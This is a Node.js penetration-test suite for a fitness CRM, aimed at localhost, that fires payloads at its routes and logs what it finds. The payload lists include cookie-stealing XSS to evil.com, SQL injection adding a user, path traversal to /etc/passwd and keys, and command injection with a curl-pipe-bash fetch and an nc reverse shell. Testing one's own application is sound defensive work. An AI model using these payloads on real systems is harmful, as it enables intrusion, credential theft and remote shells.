#!/usr/bin/env node

/**
 * AGGRESSIVE PENETRATION TEST SUITE FOR ATLAS FITNESS CRM
 * WARNING: This is designed to find vulnerabilities - use only on authorized targets
 */

const ATTACK_CONFIG = {
  baseUrl: 'http://localhost:3000',
  testTimeout: 60000,
  verbose: true
};

// Attack payloads database
const PAYLOADS = {
  xss: [
    '<script>alert("XSS")</script>',
    '"><script>alert("XSS")</script>',
    '<img src=x onerror=alert("XSS")>',
    'javascript:alert("XSS")',
    '<svg onload=alert("XSS")>',
    '<iframe src=javascript:alert("XSS")>',
    '<body onload=alert("XSS")>',
    '<%2Fscript%3E%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E',
    '<script>document.location="http://evil.com/steal?cookie="+document.cookie</script>',
    '"><img src=x onerror="fetch(`http://evil.com/steal?cookie=${document.cookie}`)">'
  ],
  
  sqlInjection: [
    "' OR '1'='1",
    "'; DROP TABLE users; --",
    "' UNION SELECT * FROM users --",
    "admin' --",
    "1' AND '1' = '1",
    "' OR 1=1 --",
    "'; EXEC xp_cmdshell('net user attacker password123 /add'); --",
    "' UNION SELECT password FROM users WHERE email='sam@gymleadhub.co.uk' --"
  ],
  
  pathTraversal: [
    '../../../etc/passwd',
    '..\\..\\..\\windows\\system32\\config\\sam',
    '../../../../.env',
    '../../../.git/config',
    '..%2F..%2F..%2Fetc%2Fpasswd',
    '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
    '....//....//....//etc/passwd',
    'file:///etc/passwd'
  ],
  
  commandInjection: [
    '; ls -la',
    '| cat /etc/passwd',
    '&& whoami',
    '`id`',
    '$(cat /etc/passwd)',
    '; curl http://evil.com/shell.sh | bash',
    '| nc evil.com 4444 -e /bin/bash'
  ],
  
  ldapInjection: [
    '*',
    '*)(&',
    '*)(uid=*',
    '*)(|(uid=*',
    'admin*',
    '*)(objectClass=*'
  ],
  
  xxePayloads: [
    '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><root>&test;</root>',
    '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://evil.com/steal">]><foo>&xxe;</foo>'
  ],
  
  csrfTokens: [
    'invalid_csrf_token',
    '',
    'null',
    'undefined',
    '../../csrf_bypass'
  ]
};

// Test results collector
const testResults = {
  critical: [],
  high: [],
  medium: [],
  low: [],
  passed: []
};

function logVulnerability(severity, title, details) {
  const vuln = {
    title,
    severity,
    timestamp: new Date().toISOString(),
    ...details
  };
  
  testResults[severity.toLowerCase()].push(vuln);
  
  if (ATTACK_CONFIG.verbose) {
    console.log(`\n🔴 ${severity.toUpperCase()} VULNERABILITY FOUND: ${title}`);
    console.log(`   Attack Vector: ${details.attackVector}`);
    console.log(`   Impact: ${details.impact}`);
    if (details.proof) {
      console.log(`   Proof: ${details.proof}`);
    }
  }
}

function logPass(test) {
  testResults.passed.push(test);
  if (ATTACK_CONFIG.verbose) {
    console.log(`✅ PASSED: ${test}`);
  }
}

// Test execution wrapper
async function executeTest(testName, testFn) {
  console.log(`\n🔧 Executing: ${testName}`);
  try {
    await testFn();
  } catch (error) {
    console.error(`❌ Test failed: ${error.message}`);
  }
}

// ==================== TEST SUITES ====================

async function testAuthenticationBypass() {
  console.log("\n🎯 TESTING AUTHENTICATION BYPASS VULNERABILITIES...\n");
  
  const bypassAttempts = [
    // Direct admin access attempts
    { url: '/admin', method: 'GET' },
    { url: '/admin/dashboard', method: 'GET' },
    { url: '/admin/landing-pages', method: 'GET' },
    { url: '/admin-direct', method: 'GET' },
    { url: '/saas-admin', method: 'GET' },
    
    // Debug routes that should be blocked
    { url: '/bypass-login', method: 'GET' },
    { url: '/test-login', method: 'GET' },
    { url: '/quick-login', method: 'GET' },
    { url: '/direct-dashboard', method: 'GET' },
    { url: '/auth-debug', method: 'GET' },
    { url: '/emergency', method: 'GET' },
    { url: '/get-started', method: 'GET' },
    
    // API endpoints without auth
    { url: '/api/admin/users', method: 'GET' },
    { url: '/api/admin/organizations', method: 'GET' },
    { url: '/api/leads', method: 'GET' },
    { url: '/api/customers', method: 'GET' },
    
    // Manipulated auth headers
    { 
      url: '/dashboard', 
      method: 'GET',
      headers: { 'Authorization': 'Bearer fake_token_12345' }
    },
    {
      url: '/admin',
      method: 'GET', 
      headers: { 'x-super-admin': 'true', 'x-user-id': 'fake-id' }
    },
    
    // Session manipulation
    {
      url: '/dashboard',
      method: 'GET',
      cookies: { 'sb-access-token': 'manipulated_token', 'sb-refresh-token': 'fake_refresh' }
    }
  ];
  
  for (const attempt of bypassAttempts) {
    await executeTest(`Auth Bypass: ${attempt.url}`, async () => {
      const response = await fetch(ATTACK_CONFIG.baseUrl + attempt.url, {
        method: attempt.method,
        headers: attempt.headers || {},
        credentials: 'include'
      });
      
      if (response.status === 200 || response.status === 201) {
        const body = await response.text();
        
        // Check if we got actual dashboard content
        if (body.includes('dashboard') || body.includes('admin') || body.includes('leads')) {
          logVulnerability('CRITICAL', 'Authentication Bypass', {
            attackVector: `Unauthenticated access to ${attempt.url}`,
            impact: 'Full access to protected resources without authentication',
            proof: `Response status: ${response.status}, Content includes protected data`,
            url: attempt.url,
            method: attempt.method
          });
        } else {
          logPass(`Authentication properly enforced for ${attempt.url}`);
        }
      } else if (response.status === 401 || response.status === 403 || response.status === 302) {
        logPass(`Authentication properly enforced for ${attempt.url}`);
      } else {
        console.log(`   Unexpected response: ${response.status} for ${attempt.url}`);
      }
    });
  }
}

async function testXSSVulnerabilities() {
  console.log("\n🎯 TESTING XSS VULNERABILITIES...\n");
  
  const xssTargets = [
    '/signin?redirect=',
    '/signup?redirect=',
    '/owner-login?redirect=',
    '/simple-login?redirect=',
    '/dashboard?search=',
    '/leads?filter=',
    '/booking?date=',
    '/api/search?q='
  ];
  
  for (const target of xssTargets) {
    for (const payload of PAYLOADS.xss) {
      await executeTest(`XSS: ${target} with payload`, async () => {
        const encodedPayload = encodeURIComponent(payload);
        const url = ATTACK_CONFIG.baseUrl + target + encodedPayload;
        
        const response = await fetch(url);
        const body = await response.text();
        
        // Check if payload is reflected without encoding
        if (body.includes(payload) || body.includes('<script>') && body.includes('alert')) {
          logVulnerability('HIGH', 'XSS Vulnerability', {
            attackVector: `Reflected XSS via ${target}`,
            impact: 'Session hijacking, credential theft, malicious redirects',
            proof: `Payload reflected in response: ${payload.substring(0, 50)}...`,
            url: target,
            payload: payload
          });
        } else if (body.includes('&lt;script&gt;') || body.includes('&amp;')) {
          logPass(`XSS properly mitigated for ${target}`);
        }
      });
    }
  }
  
  // Test stored XSS via API
  const storeXSSTargets = [
    { endpoint: '/api/leads', field: 'name' },
    { endpoint: '/api/leads', field: 'notes' },
    { endpoint: '/api/messages', field: 'content' },
    { endpoint: '/api/forms', field: 'title' }
  ];
  
  for (const target of storeXSSTargets) {
    await executeTest(`Stored XSS: ${target.endpoint}`, async () => {
      const response = await fetch(ATTACK_CONFIG.baseUrl + target.endpoint, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          [target.field]: '<script>alert("Stored XSS")</script>',
          email: 'test@test.com'
        })
      });
      
      if (response.status === 200 || response.status === 201) {
        logVulnerability('CRITICAL', 'Stored XSS Vulnerability', {
          attackVector: `Stored XSS via ${target.endpoint} in field ${target.field}`,
          impact: 'Persistent XSS affecting all users viewing the data',
          proof: `Payload accepted: Status ${response.status}`,
          endpoint: target.endpoint,
          field: target.field
        });
      }
    });
  }
}

async function testIDORVulnerabilities() {
  console.log("\n🎯 TESTING IDOR VULNERABILITIES...\n");
  
  const idorTargets = [
    '/api/organizations/1',
    '/api/organizations/2',
    '/api/organizations/99999',
    '/api/leads/1',
    '/api/leads/2', 
    '/api/customers/1',
    '/api/bookings/1',
    '/api/classes/1',
    '/api/users/1',
    '/api/admin/organizations/1/users',
    '/api/invoices/1',
    '/api/payments/1'
  ];
  
  for (const target of idorTargets) {
    await executeTest(`IDOR: ${target}`, async () => {
      // Try with manipulated org header
      const response1 = await fetch(ATTACK_CONFIG.baseUrl + target, {
        headers: { 'x-organization-id': '99999' }
      });
      
      // Try with different user context
      const response2 = await fetch(ATTACK_CONFIG.baseUrl + target, {
        headers: { 'x-user-id': 'different-user-id' }
      });
      
      if (response1.status === 200 || response2.status === 200) {
        const data = await (response1.status === 200 ? response1 : response2).json();
        
        if (data && Object.keys(data).length > 0) {
          logVulnerability('CRITICAL', 'IDOR Vulnerability', {
            attackVector: `Direct object reference allows access to ${target}`,
            impact: 'Access to other organizations/users data',
            proof: `Data retrieved: ${JSON.stringify(data).substring(0, 100)}...`,
            endpoint: target
          });
        }
      } else if (response1.status === 401 || response1.status === 403) {
        logPass(`IDOR properly prevented for ${target}`);
      }
    });
  }
  
  // Test sequential ID enumeration
  console.log("\n   Testing ID enumeration...");
  for (let i = 1; i <= 10; i++) {
    await executeTest(`ID Enumeration: Organization ${i}`, async () => {
      const response = await fetch(`${ATTACK_CONFIG.baseUrl}/api/organizations/${i}`);
      if (response.status === 200) {
        logVulnerability('HIGH', 'ID Enumeration', {
          attackVector: `Sequential ID allows enumeration of organizations`,
          impact: 'Information disclosure about system entities',
          proof: `Organization ID ${i} accessible`,
          id: i
        });
      }
    });
  }
}

async function testSensitiveFileAccess() {
  console.log("\n🎯 TESTING SENSITIVE FILE ACCESS...\n");
  
  const sensitiveFiles = [
    '/.env',
    '/.env.local',
    '/.env.production',
    '/.git/config',
    '/.git/HEAD',
    '/.git/logs/HEAD',
    '/package.json',
    '/next.config.js',
    '/tsconfig.json',
    '/.gitignore',
    '/supabase/.env',
    '/supabase/seed.sql',
    '/backup.sql',
    '/database.sql',
    '/config.php',
    '/wp-config.php',
    '/.htaccess',
    '/.htpasswd',
    '/web.config',
    '/robots.txt',
    '/sitemap.xml',
    '/.well-known/security.txt',
    '/.ssh/id_rsa',
    '/.ssh/authorized_keys',
    '/id_rsa',
    '/private.key',
    '/server.key'
  ];
  
  for (const file of sensitiveFiles) {
    await executeTest(`Sensitive File: ${file}`, async () => {
      const response = await fetch(ATTACK_CONFIG.baseUrl + file);
      
      if (response.status === 200) {
        const content = await response.text();
        
        // Check for actual sensitive content
        if (content.includes('DATABASE_URL') || 
            content.includes('API_KEY') || 
            content.includes('SECRET') ||
            content.includes('PASSWORD') ||
            content.includes('[core]') || // git config
            content.includes('ref:') || // git HEAD
            content.includes('"dependencies"') || // package.json
            content.includes('BEGIN RSA PRIVATE KEY')) {
          
          logVulnerability('CRITICAL', 'Sensitive File Exposure', {
            attackVector: `Direct access to ${file}`,
            impact: 'Exposure of credentials, API keys, or system configuration',
            proof: `File accessible, contains: ${content.substring(0, 100)}...`,
            file: file
          });
        }
      } else if (response.status === 403 || response.status === 404) {
        logPass(`Sensitive file properly blocked: ${file}`);
      }
    });
  }
  
  // Test path traversal
  for (const payload of PAYLOADS.pathTraversal) {
    await executeTest(`Path Traversal: ${payload}`, async () => {
      const response = await fetch(`${ATTACK_CONFIG.baseUrl}/api/files?path=${encodeURIComponent(payload)}`);
      const body = await response.text();
      
      if (body.includes('root:') || body.includes('daemon:') || body.includes('DATABASE_URL')) {
        logVulnerability('CRITICAL', 'Path Traversal', {
          attackVector: `Path traversal via ${payload}`,
          impact: 'Access to system files outside web root',
          proof: `File content retrieved: ${body.substring(0, 100)}...`,
          payload: payload
        });
      }
    });
  }
}

async function testPrivilegeEscalation() {
  console.log("\n🎯 TESTING PRIVILEGE ESCALATION...\n");
  
  // Test role manipulation
  const roleEscalationAttempts = [
    {
      endpoint: '/api/profile',
      method: 'PUT',
      body: { role: 'super_admin' }
    },
    {
      endpoint: '/api/profile',
      method: 'PATCH',
      body: { role: 'owner' }
    },
    {
      endpoint: '/api/users/me',
      method: 'PUT',
      body: { role: 'admin', is_super_admin: true }
    },
    {
      endpoint: '/api/organization/members/self',
      method: 'PUT',
      body: { role: 'owner' }
    }
  ];
  
  for (const attempt of roleEscalationAttempts) {
    await executeTest(`Privilege Escalation: ${attempt.endpoint}`, async () => {
      const response = await fetch(ATTACK_CONFIG.baseUrl + attempt.endpoint, {
        method: attempt.method,
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(attempt.body)
      });
      
      if (response.status === 200) {
        const data = await response.json();
        if (data.role === attempt.body.role) {
          logVulnerability('CRITICAL', 'Privilege Escalation', {
            attackVector: `Role manipulation via ${attempt.endpoint}`,
            impact: 'Unauthorized elevation to admin/owner privileges',
            proof: `Role changed to: ${data.role}`,
            endpoint: attempt.endpoint
          });
        }
      } else {
        logPass(`Privilege escalation prevented at ${attempt.endpoint}`);
      }
    });
  }
  
  // Test accessing other org's admin functions
  await executeTest('Cross-Organization Admin Access', async () => {
    const response = await fetch(`${ATTACK_CONFIG.baseUrl}/api/admin/organizations/1/settings`, {
      method: 'PUT',
      headers: {
        'Content-Type': 'application/json',
        'x-organization-id': '2'
      },
      body: JSON.stringify({ name: 'Hacked Org' })
    });
    
    if (response.status === 200) {
      logVulnerability('CRITICAL', 'Cross-Org Admin Access', {
        attackVector: 'Manipulating organization header to access other org',
        impact: 'Full control over other organizations',
        proof: 'Successfully modified another org settings'
      });
    }
  });
}

async function testCSRFVulnerabilities() {
  console.log("\n🎯 TESTING CSRF VULNERABILITIES...\n");
  
  const csrfTargets = [
    { endpoint: '/api/profile', method: 'PUT', body: { name: 'CSRF Test' } },
    { endpoint: '/api/leads', method: 'POST', body: { email: 'csrf@test.com' } },
    { endpoint: '/api/payments', method: 'POST', body: { amount: 1000 } },
    { endpoint: '/api/organization/settings', method: 'PUT', body: { public: true } },
    { endpoint: '/api/users/delete', method: 'DELETE', body: {} }
  ];
  
  for (const target of csrfTargets) {
    await executeTest(`CSRF: ${target.endpoint}`, async () => {
      // Try without any CSRF token
      const response1 = await fetch(ATTACK_CONFIG.baseUrl + target.endpoint, {
        method: target.method,
        headers: {
          'Content-Type': 'application/json',
          'Origin': 'http://evil.com'
        },
        body: JSON.stringify(target.body),
        credentials: 'include'
      });
      
      // Try with invalid CSRF token
      const response2 = await fetch(ATTACK_CONFIG.baseUrl + target.endpoint, {
        method: target.method,
        headers: {
          'Content-Type': 'application/json',
          'X-CSRF-Token': 'invalid_token_12345'
        },
        body: JSON.stringify(target.body),
        credentials: 'include'
      });
      
      if (response1.status === 200 || response2.status === 200) {
        logVulnerability('HIGH', 'CSRF Vulnerability', {
          attackVector: `CSRF possible on ${target.endpoint}`,
          impact: 'Unauthorized state-changing operations',
          proof: `Request accepted without valid CSRF token`,
          endpoint: target.endpoint,
          method: target.method
        });
      } else {
        logPass(`CSRF protection active for ${target.endpoint}`);
      }
    });
  }
}

async function testSQLInjection() {
  console.log("\n🎯 TESTING SQL INJECTION...\n");
  
  const sqlTargets = [
    { url: '/api/leads?search=', param: 'search' },
    { url: '/api/organizations?id=', param: 'id' },
    { url: '/api/users?email=', param: 'email' },
    { url: '/api/bookings?date=', param: 'date' },
    { url: '/api/search?q=', param: 'q' }
  ];
  
  for (const target of sqlTargets) {
    for (const payload of PAYLOADS.sqlInjection) {
      await executeTest(`SQL Injection: ${target.url}`, async () => {
        const url = ATTACK_CONFIG.baseUrl + target.url + encodeURIComponent(payload);
        const response = await fetch(url);
        const body = await response.text();
        
        // Check for SQL error messages
        if (body.includes('syntax error') || 
            body.includes('SQL') || 
            body.includes('mysql_') ||
            body.includes('PostgreSQL') ||
            body.includes('ORA-') ||
            body.includes('Microsoft SQL Server')) {
          
          logVulnerability('CRITICAL', 'SQL Injection', {
            attackVector: `SQL injection via ${target.param} parameter`,
            impact: 'Database compromise, data theft, authentication bypass',
            proof: `SQL error in response: ${body.substring(0, 200)}...`,
            endpoint: target.url,
            payload: payload
          });
        } else if (response.status === 500) {
          logVulnerability('MEDIUM', 'Potential SQL Injection', {
            attackVector: `Possible SQL injection via ${target.param}`,
            impact: 'Server error may indicate SQL injection',
            proof: `500 error with payload: ${payload}`,
            endpoint: target.url
          });
        }
      });
    }
  }
}

async function testRateLimiting() {
  console.log("\n🎯 TESTING RATE LIMITING...\n");
  
  const endpoints = [
    '/api/auth/login',
    '/api/leads',
    '/api/messages/send',
    '/api/payments'
  ];
  
  for (const endpoint of endpoints) {
    await executeTest(`Rate Limiting: ${endpoint}`, async () => {
      let successCount = 0;
      const requests = 100;
      
      for (let i = 0; i < requests; i++) {
        const response = await fetch(ATTACK_CONFIG.baseUrl + endpoint, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ test: i })
        });
        
        if (response.status !== 429) {
          successCount++;
        }
      }
      
      if (successCount === requests) {
        logVulnerability('HIGH', 'No Rate Limiting', {
          attackVector: `No rate limiting on ${endpoint}`,
          impact: 'DoS attacks, brute force, resource exhaustion',
          proof: `${successCount}/${requests} requests succeeded`,
          endpoint: endpoint
        });
      } else {
        logPass(`Rate limiting active: ${requests - successCount} requests blocked`);
      }
    });
  }
}

async function testBusinessLogicFlaws() {
  console.log("\n🎯 TESTING BUSINESS LOGIC FLAWS...\n");
  
  // Test negative amounts
  await executeTest('Negative Payment Amount', async () => {
    const response = await fetch(`${ATTACK_CONFIG.baseUrl}/api/payments`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ amount: -1000, customerId: '1' })
    });
    
    if (response.status === 200) {
      logVulnerability('HIGH', 'Negative Amount Accepted', {
        attackVector: 'Negative payment amount bypasses validation',
        impact: 'Financial loss, account credit manipulation',
        proof: 'Negative amount accepted by payment endpoint'
      });
    }
  });
  
  // Test duplicate bookings
  await executeTest('Double Booking', async () => {
    const bookingData = {
      classId: '1',
      userId: '1',
      date: '2024-01-20',
      time: '10:00'
    };
    
    const response1 = await fetch(`${ATTACK_CONFIG.baseUrl}/api/bookings`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(bookingData)
    });
    
    const response2 = await fetch(`${ATTACK_CONFIG.baseUrl}/api/bookings`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(bookingData)
    });
    
    if (response1.status === 200 && response2.status === 200) {
      logVulnerability('MEDIUM', 'Double Booking Allowed', {
        attackVector: 'Same booking can be created multiple times',
        impact: 'Data integrity issues, overbooking',
        proof: 'Both booking requests succeeded'
      });
    }
  });
  
  // Test free premium features
  await executeTest('Premium Feature Bypass', async () => {
    const response = await fetch(`${ATTACK_CONFIG.baseUrl}/api/features/premium`, {
      headers: { 'x-subscription-tier': 'premium' }
    });
    
    if (response.status === 200) {
      logVulnerability('HIGH', 'Premium Feature Bypass', {
        attackVector: 'Header manipulation enables premium features',
        impact: 'Revenue loss, unauthorized feature access',
        proof: 'Premium features accessible with manipulated header'
      });
    }
  });
}

async function testSessionManagement() {
  console.log("\n🎯 TESTING SESSION VULNERABILITIES...\n");
  
  // Test session fixation
  await executeTest('Session Fixation', async () => {
    const fixedSession = 'fixed_session_id_12345';
    const response = await fetch(`${ATTACK_CONFIG.baseUrl}/api/auth/login`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Cookie': `session=${fixedSession}`
      },
      body: JSON.stringify({ email: 'test@test.com', password: 'password' })
    });
    
    const setCookie = response.headers.get('set-cookie');
    if (setCookie && setCookie.includes(fixedSession)) {
      logVulnerability('HIGH', 'Session Fixation', {
        attackVector: 'Session ID not regenerated after login',
        impact: 'Session hijacking, unauthorized access',
        proof: 'Fixed session ID accepted'
      });
    }
  });
  
  // Test concurrent sessions
  await executeTest('Concurrent Session Control', async () => {
    // Simulate multiple login attempts from different locations
    const sessions = [];
    for (let i = 0; i < 5; i++) {
      const response = await fetch(`${ATTACK_CONFIG.baseUrl}/api/auth/login`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'X-Forwarded-For': `192.168.1.${i}`
        },
        body: JSON.stringify({ email: 'test@test.com', password: 'password' })
      });
      
      if (response.status === 200) {
        sessions.push(response.headers.get('set-cookie'));
      }
    }
    
    if (sessions.length === 5) {
      logVulnerability('MEDIUM', 'No Concurrent Session Control', {
        attackVector: 'Multiple active sessions allowed',
        impact: 'Difficult to detect compromised accounts',
        proof: `${sessions.length} concurrent sessions created`
      });
    }
  });
}

async function testSecurityHeaders() {
  console.log("\n🎯 TESTING SECURITY HEADERS...\n");
  
  const response = await fetch(ATTACK_CONFIG.baseUrl);
  const headers = response.headers;
  
  const requiredHeaders = [
    'Content-Security-Policy',
    'X-Frame-Options',
    'X-Content-Type-Options',
    'Strict-Transport-Security',
    'X-XSS-Protection',
    'Referrer-Policy',
    'Permissions-Policy'
  ];
  
  for (const header of requiredHeaders) {
    if (!headers.get(header.toLowerCase())) {
      logVulnerability('MEDIUM', `Missing Security Header: ${header}`, {
        attackVector: `Security header ${header} not set`,
        impact: 'Reduced defense against various attacks',
        proof: 'Header not present in response'
      });
    } else {
      logPass(`Security header present: ${header}`);
    }
  }
}

// ==================== REPORT GENERATION ====================

function generateReport() {
  console.log("\n\n" + "=".repeat(80));
  console.log("                    PENETRATION TEST REPORT");
  console.log("=".repeat(80));
  console.log(`Test Date: ${new Date().toISOString()}`);
  console.log(`Target: ${ATTACK_CONFIG.baseUrl}`);
  console.log("\n");
  
  const severities = ['critical', 'high', 'medium', 'low'];
  let totalVulns = 0;
  
  for (const severity of severities) {
    const vulns = testResults[severity];
    totalVulns += vulns.length;
    
    if (vulns.length > 0) {
      console.log(`\n${severity.toUpperCase()} SEVERITY (${vulns.length})`);
      console.log("-".repeat(40));
      
      vulns.forEach((vuln, index) => {
        console.log(`\n${index + 1}. ${vuln.title}`);
        console.log(`   Attack Vector: ${vuln.attackVector}`);
        console.log(`   Impact: ${vuln.impact}`);
        if (vuln.proof) {
          console.log(`   Proof: ${vuln.proof}`);
        }
        if (vuln.recommendation) {
          console.log(`   Fix: ${vuln.recommendation}`);
        }
      });
    }
  }
  
  console.log("\n\nSUMMARY");
  console.log("-".repeat(40));
  console.log(`Total Vulnerabilities Found: ${totalVulns}`);
  console.log(`  - Critical: ${testResults.critical.length}`);
  console.log(`  - High: ${testResults.high.length}`);
  console.log(`  - Medium: ${testResults.medium.length}`);
  console.log(`  - Low: ${testResults.low.length}`);
  console.log(`Tests Passed: ${testResults.passed.length}`);
  
  console.log("\n\nRECOMMENDATIONS");
  console.log("-".repeat(40));
  
  if (testResults.critical.length > 0) {
    console.log("🔴 CRITICAL: Fix authentication bypass and access control issues immediately!");
  }
  if (testResults.high.length > 0) {
    console.log("🟠 HIGH: Address XSS, SQL injection, and CSRF vulnerabilities urgently");
  }
  if (testResults.medium.length > 0) {
    console.log("🟡 MEDIUM: Implement security headers and rate limiting");
  }
  
  console.log("\n" + "=".repeat(80));
  
  // Save detailed JSON report
  const fs = require('fs').promises;
  const reportPath = './penetration-test-report.json';
  fs.writeFile(reportPath, JSON.stringify(testResults, null, 2))
    .then(() => console.log(`\n📄 Detailed report saved to: ${reportPath}`))
    .catch(err => console.error('Failed to save report:', err));
}

// ==================== MAIN EXECUTION ====================

async function runAllTests() {
  console.log("🚨 STARTING AGGRESSIVE PENETRATION TEST 🚨");
  console.log("Target: " + ATTACK_CONFIG.baseUrl);
  console.log("-".repeat(80));
  
  await testAuthenticationBypass();
  await testXSSVulnerabilities();
  await testIDORVulnerabilities();
  await testSensitiveFileAccess();
  await testPrivilegeEscalation();
  await testCSRFVulnerabilities();
  await testSQLInjection();
  await testRateLimiting();
  await testBusinessLogicFlaws();
  await testSessionManagement();
  await testSecurityHeaders();
  
  generateReport();
}

// Check if running directly
if (require.main === module) {
  runAllTests().catch(console.error);
}

module.exports = { runAllTests, testResults };